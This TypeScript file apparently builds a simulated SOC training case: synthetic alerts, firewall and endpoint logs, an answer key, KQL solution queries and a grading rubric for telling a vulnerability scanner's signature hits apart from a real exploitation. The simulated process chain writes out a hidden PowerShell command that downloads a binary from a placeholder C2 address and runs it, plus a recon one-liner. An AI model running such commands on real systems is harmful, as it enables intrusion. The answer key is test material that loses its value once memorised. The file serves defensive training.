// Templates built from context another mode supplies. `endpoint-known-vuln-exploit`
// (WP5, DESIGN section 8) receives `ctx.vulnHook` and is added to a shift only by
// the vulnerability hook; it is never picked at random and stays out of ALL_TEMPLATES.
//
// The alert is the SOC side of a vulnerability finding that was left open: a
// known-exploit signature fires against that host, and the host then behaves
// like a compromised one. The telemetry fits the host's platform, role and
// exposure in the shared world (CMDB): an internet-facing host shows inbound
// firewall sessions and outbound sessions only (its noise has no process data);
// an internal Windows application server (the IIS role, APP01) shows an
// internal source, an endpoint alert and a process chain; every other internal
// host is network-level only. The authorised scanner trips the same signature
// against the same host and a few others of the same service family, so a
// signature hit alone proves nothing: the follow-on does. The ATT&CK key fits
// the class: T1190 for an Internet-facing host, T1210 when the exploit comes
// from an internal address (and then the attacker is already inside).
//
// Facts here are fictional (DESIGN section 9): ids are SIMVULN-YYYY-NNNNN, hosts
// come from the world, attacker addresses come from `ctx.infra.ip()` and no
// attacker-role domain or WHOIS row is ever written.

import type { CaseContext, CaseSpec, CaseTemplate, EvidenceSpec, IndicatorSpec } from '../model.ts';
import type { RowRef } from '../../logs/corpus.ts';
import type { Host } from '../../world/world.ts';
import type { Tactic } from '../../types.ts';
import { atLocalHour, HOUR, MIN, SEC } from '../../logs/time.ts';
import { SUBNETS } from '../../synth/addresses.ts';
import { BIN, binaryHash } from '../../synth/software.ts';
import { formatSimVulnId, isSimVulnId } from '../../vuln/ids.ts';
import { host as hostIndicator, ip as ipIndicator, kdt, rubric, sha, technique } from './util.ts';

// The union over the host classes (study skills); each build states its own subset.
const TACTICS: Tactic[] = ['initial-access', 'lateral-movement', 'command-and-control'];

// Hosts that can stand in when no hook is supplied (the harness path) or when the
// hook names something without an address.
const FALLBACK_HOSTS = ['WEB01', 'APP01'];
// The other servers the authorised scanner may touch in the same window.
const SCAN_COMPANIONS = ['FS01', 'SQL01', 'APP01', 'BUILD01', 'PRINT01', 'JUMP01', 'WEB01'];
// The scanner's standing change ticket says "business hours".
const BUSINESS_START_HOUR = 8;
const BUSINESS_END_HOUR = 18;

type Klass = 'edge' | 'windows' | 'network';

const isVpn = (h: Host) => h.role.toLowerCase().includes('vpn');

// Only an internal Windows application server (the IIS role) gets the w3wp and
// monitoring-agent story; every other internal host is seen at the network level.
function classOf(h: Host): Klass {
  if (h.exposed) return 'edge';
  return h.os.startsWith('Windows') && h.kind === 'server' && h.role.toLowerCase().includes('application') ? 'windows' : 'network';
}

const productOf = (k: Klass) => (k === 'edge' ? 'Perimeter firewall (intrusion prevention)' : k === 'windows' ? 'Microsoft Defender for Endpoint' : 'Network Detection & Response');

// A signature is about one service. Web ports share a family; any other port only matches itself,
// so a product-specific signature never lands on SMB, RDP or SQL unless the finding itself is there.
const WEB_PORTS = [443, 8443];
const sameFamily = (a: number, b: number) => a === b || (WEB_PORTS.includes(a) && WEB_PORTS.includes(b));

// The port of the affected service, from what the CMDB says the host is for.
function servicePort(h: Host): number {
  if (h.exposed) return 443;
  const role = h.role.toLowerCase();
  if (role.includes('database')) return 1433;
  if (role.includes('file')) return 445;
  if (role.includes('application')) return 8443;
  if (role.includes('rdp') || role.includes('jump')) return 3389;
  if (h.kind === 'laptop' || h.kind === 'desktop') return 445;
  return 443;
}

const PORT_RULE: Record<number, string> = {
  8443: 'allow-lob-app',
  1433: 'allow-sql-clients',
  445: 'allow-smb-fileservers',
  3389: 'allow-rdp-jump',
  443: 'allow-internal-https',
};

function pickTarget(ctx: CaseContext): { host: Host; vulnId: string } {
  const hooked = ctx.vulnHook ? ctx.world.hosts.find((h) => h.name === ctx.vulnHook!.host) : undefined;
  const frng = ctx.rng.fork('fallback');
  const names = FALLBACK_HOSTS.filter((n) => ctx.world.hosts.some((h) => h.name === n));
  const fallbackName = frng.pick(names.length ? names : ['WEB01']);
  const fallback = ctx.world.hosts.find((h) => h.name === fallbackName)!;
  const host = hooked && hooked.ip !== '' ? hooked : fallback;
  const vulnId = ctx.vulnHook && isSimVulnId(ctx.vulnHook.vulnId) ? ctx.vulnHook.vulnId : formatSimVulnId(2026, frng.int(10000, 99999));
  return { host, vulnId };
}

const endpointKnownVulnExploit: CaseTemplate = {
  id: 'endpoint-known-vuln-exploit',
  category: 'c2',
  difficulty: 'tier2',
  title: 'Exploit signature match on a monitored service',
  lesson: 'A signature hit is not a compromise, the follow-on from the host is; an unpatched finding is how the first becomes the second.',
  cysaDomains: ['1.0', '2.0', '3.0'],
  tactics: TACTICS,
  kind: 'incident',
  // The scanner's standing change ticket is for business hours, and the scan runs 55-120 minutes
  // before the alert, so the alert itself is placed in the business day.
  when: 'business',
  build(ctx) {
    const { rng, log, idx, at, now, world } = ctx;
    const { host: target, vulnId } = pickTarget(ctx);
    const klass = classOf(target);
    const port = servicePort(target);
    const rule = PORT_RULE[port] ?? 'allow-internal-https';
    const scanner = target.name === 'SCAN01' ? undefined : world.hosts.find((h) => h.name === 'SCAN01');
    const ad = world.org.netbios;
    const utcOffset = world.org.utcOffset;

    const product = productOf(klass);
    const ruleName = 'Exploit signature match on a monitored service';
    const tx = at - rng.int(4, 9) * MIN; // the real exploitation
    const scanLead = rng.int(55, 120) * MIN; // the scanner's run, before the alert
    const createdDaysAgo = rng.int(20, 90);

    // The scan start must lie inside the window the ticket states: business hours. If the shift
    // already carries the standing approval of the scheduled scan (network-authorized-vulnscan),
    // that ticket is reused and the scan is placed inside its window; this item is built last.
    // If that approval exists but its window cannot hold this scan, a different ticket is written:
    // a one-off change for an ad-hoc verification scan, so the shift never carries two standing
    // approvals for the same scanner. Without any existing approval this item writes its own.
    const existingTicket = scanner ? log.find('Tickets', (r) => r.Type === 'Change' && r.AssignedTo === 'svc-scan') : undefined;
    let scanTicket: RowRef | undefined;
    let ticketKind: 'reuse' | 'oneoff' | 'own' = 'own';
    let tScan = Math.min(Math.max(at - scanLead, atLocalHour(at, BUSINESS_START_HOUR, utcOffset) + 15 * MIN), at - 12 * MIN);
    if (existingTicket) {
      const lo = Math.max(Number(existingTicket.row.WindowStart) + MIN, at - 120 * MIN);
      const hi = Math.min(Number(existingTicket.row.WindowEnd) - 10 * MIN, at - 12 * MIN);
      if (lo <= hi) {
        scanTicket = existingTicket;
        ticketKind = 'reuse';
        tScan = Math.min(Math.max(at - scanLead, lo), hi);
      } else {
        ticketKind = 'oneoff';
      }
    }

    // ---- where the real traffic comes from
    let attacker: string;
    let pubIp = '';
    let inboundRule = 'allow-web-dmz';
    if (klass === 'edge') {
      attacker = ctx.infra.ip('vps');
      pubIp = isVpn(target) ? world.publicIps.vpn : world.publicIps.web;
      inboundRule = isVpn(target) ? 'allow-vpn-portal' : 'allow-web-dmz';
    } else {
      const prefix = world.sites[0].prefix;
      // The address must be new to the whole shift: no device, session or row of another alert uses it.
      const inRows = (c: string) =>
        !!log.find('FirewallLogs', (r) => r.SourceIP === c || r.DestinationIP === c) ||
        !!log.find('SecurityEvent', (r) => r.IpAddress === c) ||
        !!log.find('DeviceNetworkEvents', (r) => r.LocalIP === c || r.RemoteIP === c);
      let candidate = '';
      for (let i = 0; i < 400 && !candidate; i++) {
        const c = `${prefix}.${rng.int(SUBNETS.workstationsFrom, SUBNETS.workstationsTo)}.${rng.int(5, 250)}`;
        if (!idx.hostByIp(c) && !ctx.sessions.some((s) => s.lanIp === c) && !inRows(c)) candidate = c;
      }
      if (!candidate) throw new Error('No free internal address for the unmanaged source');
      attacker = candidate;
    }
    const c2 = ctx.infra.ip('c2');
    const dstIp = klass === 'edge' ? pubIp : target.ip;
    const direction = klass === 'edge' ? 'Inbound' : 'Internal';
    const sessionRule = klass === 'edge' ? inboundRule : rule;

    // ---- the signature's alert rows
    // Product and wording follow the class of the host the alert is on, scanner hits included.
    const hitText = (src: string, on: Host, p: number) =>
      classOf(on) === 'windows'
        ? `Exploit signature for ${vulnId} matched in inbound traffic to ${on.name}:${p} from ${src}.`
        : `Signature for ${vulnId} matched on a session from ${src} to ${on.name}:${p}. Detect mode: the session was not blocked.`;
    const hit = (t: number, src: string, on: Host, p: number, status: 'New' | 'Resolved') =>
      log.alert({ TimeGenerated: t, AlertName: ruleName, ProductName: productOf(classOf(on)), AlertSeverity: 'High', CompromisedEntity: on.name, Entities: src, Tactics: classOf(on) === 'edge' ? 'InitialAccess' : 'LateralMovement', Status: status, Description: hitText(src, on, p) });

    // ---- look-alikes: the authorised scanner trips the same signature on other servers of the same
    // service family (same port, or both web), each in the telemetry of its own class.
    const pool = SCAN_COMPANIONS.filter((n) => n !== target.name && world.hosts.some((h) => h.name === n))
      .map((n) => idx.host(n))
      .filter((h) => sameFamily(servicePort(h), port));
    const companions = rng.sample(pool, rng.int(1, 2));
    const scanTargets = [target, ...companions];
    const scanHostAlerts: RowRef[] = [];
    const scanLogons: RowRef[] = [];
    let scannerInfo: RowRef | undefined;
    if (scanner) {
      if (!scanTicket) {
        const businessEnd = atLocalHour(at, BUSINESS_END_HOUR, utcOffset);
        const hoursText = `${String(BUSINESS_START_HOUR).padStart(2, '0')}:00-${BUSINESS_END_HOUR}:00 local time`;
        scanTicket =
          ticketKind === 'oneoff'
            ? log.ticket({
                TicketId: log.nextTicketId('CHG'), Type: 'Change', Title: `One-off change — ad-hoc verification scan of ${scanTargets.map((h) => h.name).join(', ')}`, Requester: 'Security — Vulnerability Management', AssignedTo: 'svc-scan',
                Status: 'Approved', Created: at - rng.int(1, 3) * 24 * HOUR, WindowStart: tScan - 15 * MIN, WindowEnd: Math.max(tScan + 15 * MIN, Math.min(tScan + 45 * MIN, businessEnd)), Scope: scanTargets.map((h) => h.name).join(', '),
                Details: `Single credentialed check from SCAN01 using the read-only svc-scan account, run on request to verify these hosts. Separate from the recurring scheduled scan. Runs once, inside the window above, during business hours (${hoursText}).`,
              })
            : log.ticket({
                TicketId: log.nextTicketId('CHG'), Type: 'Change', Title: 'Standing approval — authenticated vulnerability scan of server VLANs', Requester: 'Security — Vulnerability Management', AssignedTo: 'svc-scan',
                Status: 'Approved', Created: at - createdDaysAgo * 24 * HOUR, WindowStart: tScan - 15 * MIN, WindowEnd: Math.max(tScan + 15 * MIN, Math.min(tScan + 3 * HOUR, businessEnd)), Scope: 'All server VLANs, including the DMZ',
                Details: `Recurring credentialed scan from SCAN01 using the read-only svc-scan account. Runs weekly during business hours (${hoursText}).`,
              });
      }
      scannerInfo = log.deviceRef('SCAN01');
      scanTargets.forEach((on, i) => {
        const t = tScan + i * rng.int(20, 70) * SEC;
        const p = servicePort(on);
        log.fw({ TimeGenerated: t, Direction: 'Internal', Action: 'Allow', Protocol: 'TCP', SourceIP: scanner.ip, SourcePort: rng.int(49152, 65000), DestinationIP: on.ip, DestinationPort: p, RuleName: 'allow-scanner', BytesSent: rng.int(300, 2500), BytesReceived: rng.int(600, 9000), SessionDurationSec: rng.int(0, 3) });
        const row = hit(t + 2 * SEC, scanner.ip, on, p, 'Resolved');
        if (on.name === target.name) scanHostAlerts.push(row);
        if (on.os.startsWith('Windows') && on.kind !== 'appliance') {
          scanLogons.push(log.sec({ TimeGenerated: t + 4 * SEC, Computer: on.name, EventID: 4624, Account: '-', TargetAccount: `${ad}\\svc-scan`, LogonType: 3, IpAddress: scanner.ip, WorkstationName: 'SCAN01', AuthenticationPackage: 'Kerberos', ElevatedToken: 'No' }));
        }
      });
    }

    // ---- the real exploitation
    const probes: RowRef[] = [];
    const nProbes = rng.int(2, 3);
    for (let i = 0; i < nProbes; i++) {
      probes.push(log.fw({ TimeGenerated: tx - (nProbes - i) * rng.int(8, 25) * SEC, Direction: direction, Action: 'Allow', Protocol: 'TCP', SourceIP: attacker, SourcePort: rng.int(30000, 65000), DestinationIP: dstIp, DestinationPort: port, RuleName: sessionRule, BytesSent: rng.int(300, 900), BytesReceived: rng.int(500, 3000), SessionDurationSec: rng.int(0, 2) }));
    }
    const exploitSession = log.fw({ TimeGenerated: tx, Direction: direction, Action: 'Allow', Protocol: 'TCP', SourceIP: attacker, SourcePort: rng.int(30000, 65000), DestinationIP: dstIp, DestinationPort: port, RuleName: sessionRule, BytesSent: rng.int(4_000, 14_000), BytesReceived: rng.int(9_000, 60_000), SessionDurationSec: rng.int(3, 20) });
    const realHits: RowRef[] = [hit(tx + 2 * SEC, attacker, target, port, 'New')];
    if (rng.bool(0.5)) realHits.push(hit(tx + rng.int(20, 45) * SEC, attacker, target, port, 'New'));
    const sources = scanner ? 2 : 1;
    const hits = realHits.length + (scanner ? 1 : 0); // the real hits plus the scanner's one on the target

    // Legitimate clients of the same service, so an internal session is not rare by itself.
    if (klass !== 'edge') {
      for (const s of rng.sample(ctx.sessions.filter((x) => x.lanIp !== ''), 4)) {
        const lo = Math.max(s.start, tx - 3 * HOUR);
        const hi = Math.min(s.end, tx - 10 * MIN);
        if (hi > lo) log.fw({ TimeGenerated: rng.int(lo, hi), Direction: 'Internal', Action: 'Allow', Protocol: 'TCP', SourceIP: s.lanIp, SourcePort: rng.int(49152, 65000), DestinationIP: target.ip, DestinationPort: port, RuleName: rule, BytesSent: rng.int(900, 6000), BytesReceived: rng.int(4_000, 400_000), SessionDurationSec: rng.int(2, 120) });
      }
    }

    // ---- the follow-on, in the telemetry this host really has
    const tEnd = Math.min(now - 20 * SEC, tx + 35 * MIN);
    const period = rng.pick([55, 60, 75]) * SEC;
    const t0 = tx + rng.int(45, 100) * SEC;
    const follow: RowRef[] = [];
    const chain: RowRef[] = [];
    const dropped: RowRef[] = [];
    const beacons: RowRef[] = [];
    let loaderHash = '';
    let tool = '';
    if (klass === 'windows') {
      // The IIS application role: the service worker is w3wp.exe under its application pool.
      const parent = { file: 'w3wp.exe', cmd: 'c:\\windows\\system32\\inetsrv\\w3wp.exe -ap "LobApp"', account: 'iis apppool\\lobapp' };
      tool = rng.pick(['svcupd.exe', 'winhlp32.exe', 'msupdt.exe']);
      const toolPath = `C:\\Windows\\Temp\\${tool}`;
      loaderHash = ctx.infra.hash('loader');
      const proc = (t: number, file: string, path: string, cmd: string, pFile: string, pCmd: string, sig: string, h: string) =>
        log.proc({ TimeGenerated: t, DeviceName: target.name, AccountName: parent.account, FileName: file, FolderPath: path, ProcessCommandLine: cmd, SHA256: h, Signer: sig, ProcessIntegrityLevel: 'High', InitiatingProcessFileName: pFile, InitiatingProcessCommandLine: pCmd });
      const t1 = tx + rng.int(8, 20) * SEC;
      const cmd1 = proc(t1, 'cmd.exe', BIN.cmd.path, 'cmd.exe /c whoami & hostname & ipconfig /all', parent.file, parent.cmd, 'Microsoft Windows', binaryHash('cmd.exe'));
      const who = proc(t1 + 1 * SEC, 'whoami.exe', BIN.whoami.path, 'whoami', 'cmd.exe', 'cmd.exe /c whoami & hostname & ipconfig /all', 'Microsoft Windows', binaryHash('whoami.exe'));
      const t2 = t1 + rng.int(25, 50) * SEC;
      const psCmd = `powershell.exe -nop -w hidden -c "(New-Object Net.WebClient).DownloadFile('http://${c2}/${rng.hex(4)}','${toolPath}')"`;
      const cmd2 = proc(t2, 'cmd.exe', BIN.cmd.path, `cmd.exe /c ${psCmd}`, parent.file, parent.cmd, 'Microsoft Windows', binaryHash('cmd.exe'));
      const ps = proc(t2 + 1 * SEC, 'powershell.exe', BIN.powershell.path, psCmd, 'cmd.exe', `cmd.exe /c ${psCmd.slice(0, 40)}…`, 'Microsoft Windows', binaryHash('powershell.exe'));
      const netDl = log.net({ TimeGenerated: t2 + 3 * SEC, DeviceName: target.name, LocalIP: target.ip, RemoteIP: c2, RemotePort: 80, RemoteUrl: '', InitiatingProcessFileName: 'powershell.exe', InitiatingProcessAccountName: parent.account });
      const file = log.file({ TimeGenerated: t2 + 5 * SEC, DeviceName: target.name, ActionType: 'FileCreated', FileName: tool, FolderPath: toolPath, FileSize: rng.int(180_000, 520_000), SHA256: loaderHash, InitiatingProcessFileName: 'powershell.exe', InitiatingProcessAccountName: parent.account });
      const t3 = t2 + rng.int(8, 14) * SEC;
      const run = proc(t3, tool, toolPath, toolPath, 'cmd.exe', `cmd.exe /c ${toolPath}`, 'Unsigned', loaderHash);
      chain.push(cmd1, who, cmd2, ps, run);
      dropped.push(file, netDl);
      for (let t = t3 + 15 * SEC; t < tEnd && beacons.length < 16; t += period + rng.int(-5, 5) * SEC) {
        beacons.push(log.net({ TimeGenerated: t, DeviceName: target.name, LocalIP: target.ip, RemoteIP: c2, RemotePort: 443, RemoteUrl: '', InitiatingProcessFileName: tool, InitiatingProcessAccountName: parent.account }));
      }
      if (beacons.length === 0) beacons.push(log.net({ TimeGenerated: Math.min(t3 + 15 * SEC, now - 10 * SEC), DeviceName: target.name, LocalIP: target.ip, RemoteIP: c2, RemotePort: 443, RemoteUrl: '', InitiatingProcessFileName: tool, InitiatingProcessAccountName: parent.account }));
      // The host's own routine: the monitoring account's health check and Defender's signature update.
      log.proc({ TimeGenerated: tx - rng.int(20, 90) * MIN, DeviceName: target.name, AccountName: 'svc-monitor', FileName: 'powershell.exe', FolderPath: BIN.powershell.path, ProcessCommandLine: 'powershell.exe -NoProfile -NonInteractive -Command "Get-Service W3SVC, WAS | Select-Object Name, Status"', SHA256: binaryHash('powershell.exe'), Signer: BIN.powershell.signer, ProcessIntegrityLevel: 'Medium', InitiatingProcessFileName: 'svchost.exe', InitiatingProcessCommandLine: 'C:\\Windows\\system32\\svchost.exe -k netsvcs -p -s Schedule' });
      const updates = world.serviceIps[Object.keys(world.serviceIps)[0]];
      if (updates?.length) {
        log.net({ TimeGenerated: tx - rng.int(30, 140) * MIN, DeviceName: target.name, LocalIP: target.ip, RemoteIP: rng.pick(updates), RemotePort: 443, RemoteUrl: '', InitiatingProcessFileName: BIN.mpcmdrun.file, InitiatingProcessAccountName: 'SYSTEM' });
      }
    } else {
      // Network-level only: the firewall sees the host open a session to an address it never used.
      const outRule = klass === 'edge' ? 'allow-dmz-outbound' : 'allow-server-outbound';
      const first = log.fw({ TimeGenerated: t0, Direction: 'Outbound', Action: 'Allow', Protocol: 'TCP', SourceIP: target.ip, SourcePort: rng.int(49152, 65000), DestinationIP: c2, DestinationPort: 443, RuleName: outRule, BytesSent: rng.int(1_500, 4_000), BytesReceived: rng.int(1_800_000, 5_000_000), SessionDurationSec: rng.int(4, 20) });
      follow.push(first);
      for (let t = t0 + 40 * SEC; t < tEnd && beacons.length < 16; t += period + rng.int(-5, 5) * SEC) {
        beacons.push(log.fw({ TimeGenerated: t, Direction: 'Outbound', Action: 'Allow', Protocol: 'TCP', SourceIP: target.ip, SourcePort: rng.int(49152, 65000), DestinationIP: c2, DestinationPort: 443, RuleName: outRule, BytesSent: rng.int(300, 900), BytesReceived: rng.int(200, 700), SessionDurationSec: rng.int(1, 3) }));
      }
      if (beacons.length === 0) beacons.push(log.fw({ TimeGenerated: Math.min(t0 + 40 * SEC, now - 10 * SEC), Direction: 'Outbound', Action: 'Allow', Protocol: 'TCP', SourceIP: target.ip, SourcePort: rng.int(49152, 65000), DestinationIP: c2, DestinationPort: 443, RuleName: outRule, BytesSent: rng.int(300, 900), BytesReceived: rng.int(200, 700), SessionDurationSec: 1 }));
      // The host's routine outbound traffic: a few sessions to a known service.
      const services = Object.values(world.serviceIps).flat();
      if (services.length) {
        const known = rng.pick(services);
        for (let i = 0; i < rng.int(2, 3); i++) {
          log.fw({ TimeGenerated: tx - rng.int(12, 150) * MIN, Direction: 'Outbound', Action: 'Allow', Protocol: 'TCP', SourceIP: target.ip, SourcePort: rng.int(49152, 65000), DestinationIP: known, DestinationPort: 443, RuleName: outRule, BytesSent: rng.int(500, 2_000), BytesReceived: rng.int(20_000, 400_000), SessionDurationSec: rng.int(1, 12) });
        }
      }
    }

    // ---- the answer key
    const approval = ticketKind === 'own' ? 'a standing approval' : ticketKind === 'oneoff' ? 'an approved one-off scan change' : 'an approved change for the scan';
    const where = klass === 'edge' ? 'the internet' : 'an unmanaged internal address';
    // Wording follows the role: a web server and a VPN concentrator each have their own normal behaviour.
    const edgeNoun = isVpn(target) ? 'A VPN concentrator' : 'A public web server';
    const internalNoun = klass === 'windows' ? 'An internal application server' : 'An internal host with this role';
    const evidence: EvidenceSpec[] = [
      { id: 'hit', label: `The signature fired on ${target.name}:${port} from ${attacker}, a source that is neither the scanner nor a known client, and the session was allowed`, why: `Several hits share one signature; what matters is who sent each. This one came from ${where} and reached the service.`, rows: [...realHits, exploitSession] },
    ];
    if (scanTicket && scannerInfo) {
      evidence.push({ id: 'scanner', label: `The other hits are SCAN01's authorised scan: ${approval} covers the window and nothing follows them`, why: 'The scanner trips the same signature by design. It explains those hits, not the one from the other source, and none of them is followed by activity on the host.', rows: [scanTicket, scannerInfo, ...scanHostAlerts, ...scanLogons] });
    }
    if (klass === 'edge') {
      evidence.push({ id: 'exposure', label: `${target.name} is reachable from the internet, so an outside source reaching the service is the expected path`, why: 'The CMDB marks the host as internet-exposed: the question is what happened after the session, not whether it could arrive.', rows: [log.deviceRef(target.name)] });
      evidence.push({ id: 'followon', label: `${target.name} opened outbound sessions to ${c2}, an address it had never used, and repeats them about every ${Math.round(period / SEC)}s`, why: `${edgeNoun} does not call out to a new address on a timer. This is the host answering its new owner: exploitation succeeded.`, rows: [...follow, ...beacons] });
    } else if (klass === 'network') {
      evidence.push({ id: 'followon', label: `${target.name} opened outbound sessions to ${c2}, an address it had never used, and repeats them about every ${Math.round(period / SEC)}s`, why: `${internalNoun} does not call out to a new external address on a timer. This is the host answering its new owner: exploitation succeeded.`, rows: [...follow, ...beacons] });
    } else {
      evidence.push({ id: 'chain', label: `The service process on ${target.name} spawned a command shell, which downloaded and ran ${tool}`, why: 'A service worker starting cmd.exe and PowerShell, then running an unsigned binary from a temp folder, is what exploitation looks like on the host.', rows: [...chain, ...dropped] });
      evidence.push({ id: 'beacon', label: `${tool} on ${target.name} calls ${c2} about every ${Math.round(period / SEC)}s`, why: 'The new process holds a regular connection to an address the host never used before: command and control.', rows: beacons });
    }

    const indicators: { block: IndicatorSpec[]; scope: IndicatorSpec[]; mustNot: IndicatorSpec[] } = {
      block: [],
      scope: [hostIndicator(target.name)],
      mustNot: [],
    };
    if (klass === 'edge') indicators.block.push(ipIndicator(attacker, 'Exploit source'));
    else indicators.scope.push(ipIndicator(attacker, 'Unmanaged internal source'));
    indicators.block.push(ipIndicator(c2, 'Post-exploitation destination'));
    if (klass === 'windows') indicators.block.push(sha(loaderHash, tool));
    if (scanner) {
      indicators.mustNot.push(hostIndicator('SCAN01'), ipIndicator(scanner.ip, 'Authorised scanner'));
      if (scanLogons.length) indicators.mustNot.push({ kind: 'user', value: 'svc-scan', aliases: [`${ad}\\svc-scan`, `svc-scan@${world.org.domain}`] });
      for (const c of companions) indicators.mustNot.push(hostIndicator(c.name));
    }

    // ---- reference investigation
    const hitsQuery = `SecurityAlert\n| where Description contains "${vulnId}"\n| project TimeGenerated, CompromisedEntity, Entities, Status, Description`;
    const solution: CaseSpec['solution'] = [{ title: 'Every hit of the signature, and who sent each', kql: hitsQuery, why: scanner ? `Two kinds of source: the scanner's earlier hits (resolved, on ${scanTargets.length} servers) and ${attacker} (new).` : `Every hit comes from ${attacker} (new).` }];
    if (scanner && scannerInfo && scanTicket) {
      solution.push({ title: 'Who is the scanner source?', kql: `DeviceInfo\n| where IPAddress == "${scanner.ip}"`, why: 'SCAN01, the authorised vulnerability scanner.' });
      solution.push({ title: 'Is the scan approved?', kql: 'Tickets\n| where Type == "Change" and AssignedTo == "svc-scan"', why: ticketKind === 'own' ? 'A standing approval covers the window and all server VLANs, including the DMZ.' : ticketKind === 'oneoff' ? 'A one-off change for an ad-hoc verification scan by the same scanner covers the scan window and the hosts it hit.' : 'The approval for the scanner covers the scan window.' });
      if (scanLogons.length) solution.push({ title: 'Credentialed checks', kql: 'SecurityEvent\n| where TargetAccount has "svc-scan" and EventID == 4624\n| project TimeGenerated, Computer, IpAddress, WorkstationName, AuthenticationPackage', why: 'Kerberos logons from SCAN01 with the read-only scan account: the scanner at work, with nothing after it.' });
    }
    solution.push({ title: `The sessions to ${target.name}:${port}`, kql: `FirewallLogs\n| where DestinationIP == "${dstIp}" and DestinationPort == ${port} and SourceIP == "${attacker}"\n| project TimeGenerated, Direction, Action, SourceIP, DestinationIP, BytesSent, BytesReceived, RuleName`, why: `${attacker} reached the service and the firewall allowed it.` });
    if (klass === 'edge') solution.push({ title: 'Is the host exposed?', kql: `DeviceInfo\n| where DeviceName == "${target.name}"\n| project DeviceName, Role, OSPlatform, ExposedToInternet`, why: 'Internet-facing, as expected for its role.' });
    if (klass !== 'edge') {
      solution.push({ title: 'Is the source a managed device?', kql: `DeviceInfo\n| where IPAddress == "${attacker}"`, why: 'No device owns the address: an unmanaged source inside the network, most likely an attacker already inside (a rogue device is the other explanation). Treat it as one: that device must be found too.', expectEmpty: true });
    }
    if (klass === 'windows') {
      solution.push({ title: 'What did the host run after the hit?', kql: `DeviceProcessEvents\n| where DeviceName == "${target.name}" and TimeGenerated > ${kdt(tx - 2 * MIN)}\n| project TimeGenerated, AccountName, FileName, ProcessCommandLine, InitiatingProcessFileName`, why: 'The service worker starts cmd.exe and PowerShell, then the dropped binary.' });
      solution.push({ title: 'What was written and fetched?', kql: `DeviceFileEvents\n| where DeviceName == "${target.name}" and FileName == "${tool}"\n| project TimeGenerated, ActionType, FolderPath, SHA256, InitiatingProcessFileName`, why: 'An unsigned binary dropped into the temp folder by PowerShell.' });
      solution.push({ title: 'Where does the host connect?', kql: `DeviceNetworkEvents\n| where DeviceName == "${target.name}" and RemoteIP == "${c2}"\n| project TimeGenerated, RemoteIP, RemotePort, InitiatingProcessFileName`, why: 'The download, then a regular connection from the dropped binary.' });
    } else {
      solution.push({ title: 'What did the host do after the hit?', kql: `FirewallLogs\n| where SourceIP == "${target.ip}" and Direction == "Outbound"\n| project TimeGenerated, DestinationIP, DestinationPort, BytesSent, BytesReceived, RuleName`, why: `Mostly sessions to known services, plus a regular series to ${c2}, which it never used before.` });
    }

    const followHint = klass === 'windows' ? `DeviceProcessEvents | where DeviceName == "${target.name}" | project TimeGenerated, AccountName, FileName, ProcessCommandLine, InitiatingProcessFileName` : `FirewallLogs | where SourceIP == "${target.ip}" and Direction == "Outbound"`;

    return {
      alert: {
        rule: ruleName,
        product,
        severity: 'high',
        time: at,
        summary: `A known-exploit signature matched ${hits} time${hits === 1 ? '' : 's'} against ${target.name}:${port}, from ${sources} different source address${sources === 1 ? '' : 'es'}.`,
        entities: [{ kind: 'host', value: target.name }],
        fields: [['Service port', String(port)], ['Signature', vulnId], ['Hits', String(hits)]],
      },
      briefing: `${world.org.name} scans its servers from SCAN01, the authorised vulnerability scanner. ${target.name} runs ${target.os}, its role in the CMDB is "${target.role}", and it is ${target.exposed ? 'reachable from the internet' : 'internal only'}.`,
      // Edge: exploitation of an Internet-facing system (T1190). Internal source: exploitation of a remote
      // service from inside (T1210), with T1190 accepted.
      truth: {
        disposition: 'true-positive',
        severity: 'high',
        action: 'escalate',
        techniques: klass === 'edge' ? ['T1190', 'T1071.001'] : ['T1210', 'T1071.001'],
        tactics: klass === 'edge' ? ['initial-access', 'command-and-control'] : ['lateral-movement', 'command-and-control'],
        alsoAccept: klass === 'edge' ? ['T1105', 'T1573', 'T1059.003', 'T1059.001', 'T1033'] : ['T1190', 'T1105', 'T1573', 'T1059.003', 'T1059.001', 'T1033'],
      },
      evidence,
      indicators,
      hints: [
        scanner
          ? 'The signature fired for more than one source. Which of them do you expect on this network, and for the ones you do not: did the host do anything afterwards?'
          : 'A signature hit only says that somebody tried. Is the source one you expect on this network, and did the host do anything afterwards?',
        `SecurityAlert | where CompromisedEntity == "${target.name}" | project TimeGenerated, Entities, Status, Description`,
        followHint,
      ],
      solution,
      rubric: rubric([
        ['sources', scanner ? 'The hits come from two different sources: the authorised scanner and an address that is not.' : 'The hits come from one source, an address that is not a known client.', ['source', 'sources', 'scanner', 'two', 'different']],
        ...(scanner ? [['scanner', `The scanner explains its own hits (${approval}${scanLogons.length ? ', credentialed checks' : ''}) but not the other source.`, ['scan01', 'scanner', 'approved', 'approval', 'authorised', 'authorized']] as [string, string, string[]]] : []),
        ['followon', klass === 'windows' ? 'After the hit, the service process spawned a shell, dropped an unsigned binary and began calling out.' : 'After the hit, the host opened a regular series of outbound sessions to an address it never used before.', ['outbound', 'beacon', 'follow', 'afterwards', 'call out', 'command and control', 'c2', 'dropped', 'shell']],
        ['contain', klass === 'edge' ? `Treat ${target.name} as compromised: isolate it and block the destination and the exploit source${scanner ? ', and do not contain the scanner or the servers it merely scanned' : ''}.` : `Treat ${target.name} as compromised: isolate it, block the destination, find and contain the internal source device as well (most likely the attacker is already inside)${scanner ? ', and do not contain the scanner or the servers it merely scanned' : ''}.`, ['isolate', 'contain', 'block', 'compromised', 'escalate']],
      ]),
      explanation: [
        `The signature fired ${hits} time${hits === 1 ? '' : 's'} against ${target.name}:${port}, and a hit by itself only says that somebody tried. The first question is who:${scanner ? ` the authorised scanner (SCAN01) trips the same signature on its checks against ${scanTargets.length} server${scanTargets.length === 1 ? '' : 's'}, under an approved change${scanLogons.length ? ' and with credentialed, read-only logons' : ''}. Those hits are resolved noise. The other source, ${attacker},` : ` ${attacker}`} is ${klass === 'edge' ? 'an outside address' : 'an address no managed device owns'}, and its session was allowed.`,
        klass === 'windows'
          ? `The second question is what the host did next. ${target.name} runs the vulnerable service, and right after the hit its service process started cmd.exe, then PowerShell, which downloaded ${tool} into a temp folder; ${tool} then connected to ${c2} every ~${Math.round(period / SEC)}s. That chain is exploitation succeeding, which separates this hit from the scanner's.`
